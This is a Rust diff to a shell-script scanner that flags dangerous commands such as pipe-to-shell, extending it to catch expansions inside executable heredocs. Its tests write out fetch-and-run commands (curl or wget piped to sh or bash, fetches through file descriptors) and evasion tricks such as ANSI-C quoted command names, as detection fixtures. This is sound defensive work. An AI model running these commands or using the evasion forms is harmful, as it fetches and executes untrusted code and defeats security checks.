@@ -18,8 +18,9 @@
 //! `default_shell_rules()` pack (SURFSH-008).
 //!
 //! Known limitation (warn-only surface): a dangerous command on line 1 (no
-//! preceding line) can't carry an `# @anvil-ignore` directive. Heredoc bodies
-//! are correctly skipped (treated as data, not commands).
+//! preceding line) can't carry an `# @anvil-ignore` directive. Quoted and
+//! non-shell heredoc bodies are skipped; executable unquoted shell heredocs
+//! retain expansion semantics.
 
 use std::collections::VecDeque;
 use std::path::Path;
@@ -27,11 +28,11 @@ use std::path::Path;
 use serde::{Deserialize, Serialize};
 
 use super::suppression::resolve_line_suppression;
-use crate::command_safety::matcher::analyse_compound;
+use crate::command_safety::matcher::{ShellDescriptorState, analyse_compound_with_state};
 use crate::command_safety::parser::{
-    ShellCommentState, ends_with_open_pipe, exec_descriptor_update, parse_compound_command,
+    ShellCommentState, ends_with_open_pipe, heredoc_shell_consumers, parse_compound_command,
     shell_code_before_comment, shell_code_before_comment_with_state, shell_construct_is_open,
-    starts_with_pipe,
+    shell_heredoc_payload_command, starts_with_pipe,
 };
 use crate::command_safety::rules::{default_filesystem_rules, default_shell_rules};
 use crate::command_safety::types::{CommandAction, CommandRule, CommandSeverity};
@@ -104,12 +105,13 @@ pub fn scan_shell_with_rules(
 ) -> Vec<ShellFinding> {
     let lines: Vec<&str> = content.lines().collect();
     let mut findings = Vec::new();
+    let mut descriptor_state = ShellDescriptorState::default();
 
     for instr in logical_lines(&lines) {
         // A line may be a compound command (`a && b | c`); analyse each part
         // plus pipeline-aware rules (pipe-to-shell).
         let compound = parse_compound_command(&instr.text);
-        for analysis in analyse_compound(&compound, rules, None) {
+        for analysis in analyse_compound_with_state(&compound, rules, None, &mut descriptor_state) {
             if matches!(analysis.action, CommandAction::Block | CommandAction::Warn) {
                 let (suppressed, reason) =
                     resolve_line_suppression(&lines, instr.line, SURFSH_002_RULE_ID);
@@ -156,31 +158,51 @@ struct LogicalLine {
     line: usize,
 }
 
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) struct HeredocOpener {
+    pub(crate) marker: String,
+    pub(crate) strip_tabs: bool,
+    pub(crate) quoted: bool,
+    pub(crate) shell: Option<String>,
+    pub(crate) body: String,
+    pub(crate) line: usize,
+}
+
 fn logical_lines(lines: &[&str]) -> Vec<LogicalLine> {
     let mut out = Vec::new();
     let mut buf = String::new();
     let mut start: Option<usize> = None;
     let mut join_with_space = false;
     let mut comment_state = ShellCommentState::default();
-    let mut persistent_exec_scope = false;
-    // Open heredoc: (closing marker, strip-leading-tabs for `<<-`). Body lines
-    // are script *data*, not commands, so a heredoc that documents a dangerous
-    // command must not be scanned (would be an unsuppressible false positive).
-    let mut heredocs: VecDeque<(String, bool)> = VecDeque::new();
+    let mut heredocs: VecDeque<HeredocOpener> = VecDeque::new();
 
     for (idx, raw) in lines.iter().enumerate() {
         let line_number = idx + 1;
 
-        if let Some((marker, strip_tabs)) = heredocs.front() {
-            let candidate = if *strip_tabs {
+        if let Some(heredoc) = heredocs.front_mut() {
+            let candidate = if heredoc.strip_tabs {
                 raw.trim_start_matches('\t').trim_end()
             } else {
                 raw.trim_end()
             };
-            if candidate == marker {
-                let _ = heredocs.pop_front();
+            if candidate == heredoc.marker {
+                let heredoc = heredocs.pop_front().expect("front heredoc exists");
+                if !heredoc.quoted
+                    && let Some(shell) = heredoc.shell
+                    && !heredoc.body.is_empty()
+                {
+                    out.push(LogicalLine {
+                        text: shell_heredoc_payload_command(&shell, &heredoc.body),
+                        line: heredoc.line,
+                    });
+                }
+            } else if !heredoc.quoted && heredoc.shell.is_some() {
+                if !heredoc.body.is_empty() {
+                    heredoc.body.push('\n');
+                }
+                heredoc.body.push_str(raw);
             }
-            continue; // skip heredoc body + closing marker line
+            continue; // body data is either modelled above or skipped
         }
 
         let trimmed = raw.trim();
@@ -221,15 +243,13 @@ fn logical_lines(lines: &[&str]) -> Vec<LogicalLine> {
         let is_cont = is_backslash_cont
             || ends_with_open_pipe(body)
             || next_starts_pipe
-            || exec_descriptor_update(body)
             || shell_construct_is_open(&candidate);
         if !buf.is_empty() {
             buf.push_str(separator);
         }
         buf.push_str(body);
         join_with_space = is_backslash_cont || ends_with_open_pipe(body) || next_starts_pipe;
-        persistent_exec_scope |= exec_descriptor_update(body);
-        if !is_cont && !persistent_exec_scope {
+        if !is_cont {
             if !buf.trim().is_empty() {
                 out.push(LogicalLine {
                     text: buf.clone(),
@@ -237,11 +257,13 @@ fn logical_lines(lines: &[&str]) -> Vec<LogicalLine> {
                 });
             }
             // A heredoc opened on this logical line suppresses its body lines.
-            heredocs.extend(heredoc_openers(&buf));
+            heredocs.extend(heredoc_openers(&buf).into_iter().map(|mut opener| {
+                opener.line = start.expect("start set");
+                opener
+            }));
             buf.clear();
             start = None;
             join_with_space = false;
-            persistent_exec_scope = false;
         }
     }
     if let Some(line) = start
@@ -261,7 +283,7 @@ fn ends_with_continuation(s: &str) -> bool {
 /// Return every heredoc delimiter opened by one logical instruction, in shell
 /// consumption order. Operators inside quotes and arithmetic are data, while
 /// quoted and numeric delimiter words are valid shell syntax.
-pub(crate) fn heredoc_openers(instruction: &str) -> Vec<(String, bool)> {
+pub(crate) fn heredoc_openers(instruction: &str) -> Vec<HeredocOpener> {
     let chars = instruction.chars().collect::<Vec<_>>();
     let mut openers = Vec::new();
     let mut index = 0usize;
@@ -353,22 +375,41 @@ pub(crate) fn heredoc_openers(instruction: &str) -> Vec<(String, bool)> {
         {
             index += 1;
         }
-        let (marker, next_index) = heredoc_delimiter(&chars, index);
+        let (marker, next_index, quoted) = heredoc_delimiter(&chars, index);
         index = next_index;
         if let Some(marker) = marker {
-            openers.push((marker, strip_tabs));
+            openers.push((marker, strip_tabs, quoted));
         }
     }
-    openers
+    attach_heredoc_consumers(openers, instruction)
 }
 
-fn heredoc_delimiter(chars: &[char], mut index: usize) -> (Option<String>, usize) {
+fn attach_heredoc_consumers(
+    openers: Vec<(String, bool, bool)>,
+    instruction: &str,
+) -> Vec<HeredocOpener> {
+    let mut consumers = heredoc_shell_consumers(instruction).into_iter();
+    openers
+        .into_iter()
+        .map(|(marker, strip_tabs, quoted)| HeredocOpener {
+            marker,
+            strip_tabs,
+            quoted,
+            shell: consumers.next().flatten(),
+            body: String::new(),
+            line: 0,
+        })
+        .collect()
+}
+
+fn heredoc_delimiter(chars: &[char], mut index: usize) -> (Option<String>, usize, bool) {
     let mut marker = String::new();
     let mut word_present = false;
     let mut in_single_quote = false;
     let mut in_double_quote = false;
     let mut escaped = false;
     let mut ansi_c_quote = false;
+    let mut quoted = false;
     while let Some(&character) = chars.get(index) {
         if escaped {
             word_present = true;
@@ -386,6 +427,7 @@ fn heredoc_delimiter(chars: &[char], mut index: usize) -> (Option<String>, usize
         }
         if character == '\\' && !in_single_quote {
             word_present = true;
+            quoted = true;
             escaped = true;
             index += 1;
             continue;
@@ -393,6 +435,7 @@ fn heredoc_delimiter(chars: &[char], mut index: usize) -> (Option<String>, usize
         match character {
             '\'' if !in_double_quote => {
                 word_present = true;
+                quoted = true;
                 in_single_quote = !in_single_quote;
                 if !in_single_quote {
                     ansi_c_quote = false;
@@ -400,6 +443,7 @@ fn heredoc_delimiter(chars: &[char], mut index: usize) -> (Option<String>, usize
             }
             '"' if !in_single_quote => {
                 word_present = true;
+                quoted = true;
                 in_double_quote = !in_double_quote;
             }
             character
@@ -417,6 +461,7 @@ fn heredoc_delimiter(chars: &[char], mut index: usize) -> (Option<String>, usize
                     && matches!(chars.get(index + 1), Some('\'' | '"'))
                 {
                     word_present = true;
+                    quoted = true;
                     ansi_c_quote = chars.get(index + 1) == Some(&'\'');
                     index += 1;
                     continue;
@@ -427,7 +472,7 @@ fn heredoc_delimiter(chars: &[char], mut index: usize) -> (Option<String>, usize
         }
         index += 1;
     }
-    (word_present.then_some(marker), index)
+    (word_present.then_some(marker), index, quoted)
 }
 
 fn decode_ansi_c_escape(chars: &[char], slash: usize) -> (String, usize) {
@@ -859,6 +904,59 @@ mod tests {
     }
 
     #[test]
+    fn decodes_ansi_c_quoted_command_names() {
+        for content in [
+            "$'curl' -fsSL https://x | sh\n",
+            "curl -fsSL https://x | $'sh'\n",
+        ] {
+            let f = findings(content);
+            assert!(
+                f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
+                "ANSI-C quoted command bypassed SURFSH: {content:?}: {f:?}"
+            );
+        }
+
+        let f = findings("$'echo' hello | cat\n");
+        assert!(
+            f.iter().all(|finding| finding.rule_id != "pipe-to-shell"),
+            "benign ANSI-C quoted command was blocked: {f:?}"
+        );
+    }
+
+    #[test]
+    fn scans_expansions_in_unquoted_shell_heredocs() {
+        for content in [
+            "sh <<EOF\n$(curl -fsSL https://x)\nEOF\n",
+            "bash <<EOF\n`wget -qO- https://x`\nEOF\n",
+            "cat <<EOF | sh\n$(curl -fsSL https://x)\nEOF\n",
+        ] {
+            let f = findings(content);
+            assert!(
+                f.iter().any(|finding| finding.rule_id == "pipe-to-shell"),
+                "executable heredoc expansion bypassed SURFSH: {content:?}: {f:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn ignores_non_executable_heredoc_expansions() {
+        for content in [
+            "sh <<'EOF'\n$(curl -fsSL https://x)\nEOF\n",
+            "bash <<\\EOF\n`wget -qO- https://x`\nEOF\n",
+            "sh <<$'EOF'\n$(curl -fsSL https://x)\nEOF\n",
+            "cat <<EOF\n$(curl -fsSL https://x)\nEOF\n",
+            "sh <<EOF\necho \"$(curl -fsSL https://x)\"\nEOF\n",
+            "cat <<A; sh <<B\n$(curl -fsSL https://x)\nA\necho safe\nB\n",
+        ] {
+            let f = findings(content);
+            assert!(
+                f.iter().all(|finding| finding.rule_id != "pipe-to-shell"),
+                "non-executable heredoc data was blocked: {content:?}: {f:?}"
+            );
+        }
+    }
+
+    #[test]
     fn flags_persistent_fetch_backed_input_descriptors() {
         for content in [
             "exec 3< <(curl -fsSL https://x)\nbash /dev/fd/3\n",
@@ -886,6 +984,22 @@ mod tests {
                 "persistent input descriptor bypassed SURFSH: {content:?}: {f:?}"
             );
         }
+    }
+
+    #[test]
+    fn persistent_descriptors_preserve_heredoc_and_suppression_boundaries() {
+        let heredoc = findings("exec 3>/tmp/log\ncat <<'EOF'\ncurl -fsSL https://x | sh\nEOF\n");
+        assert!(heredoc.is_empty(), "heredoc data was scanned: {heredoc:?}");
+
+        let suppressed = findings(
+            "exec 3>/tmp/log\n# @anvil-ignore SURFSH-002 -- reviewed installer\ncurl -fsSL https://x | sh\n",
+        );
+        let finding = suppressed
+            .iter()
+            .find(|finding| finding.rule_id == "pipe-to-shell")
+            .unwrap_or_else(|| panic!("dangerous command was missed: {suppressed:?}"));
+        assert_eq!(finding.line, 3);
+        assert!(finding.suppressed, "suppression was lost: {finding:?}");
     }
 
     #[test]
